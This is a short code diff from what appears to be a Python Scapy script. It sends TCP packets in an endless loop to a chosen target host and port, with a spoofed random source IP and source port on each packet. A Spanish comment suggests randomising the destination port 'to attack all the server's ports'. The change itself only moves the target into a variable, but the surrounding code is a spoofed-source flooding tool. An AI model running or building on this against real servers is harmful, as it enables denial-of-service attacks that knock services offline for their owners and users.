@@ -22,11 +22,12 @@ def main ():
     try:
        count = 0
        while True:
+           target = parse.target
            srcip = RandIP()
            sport = RandShort()
            dport = parse.port  # o RandShort() para atacar a todos los puertos del servidor 80=http 21=ftp 443=https
 
-           IP_layer = IP(src=srcip, dst=parse.target)
+           IP_layer = IP(src=srcip, dst=target)
            TCP_layer = TCP(sport=sport, dport=dport)
            Raw_layer = Raw(load=message)
            final_packet = IP_layer/TCP_layer/Raw_layer
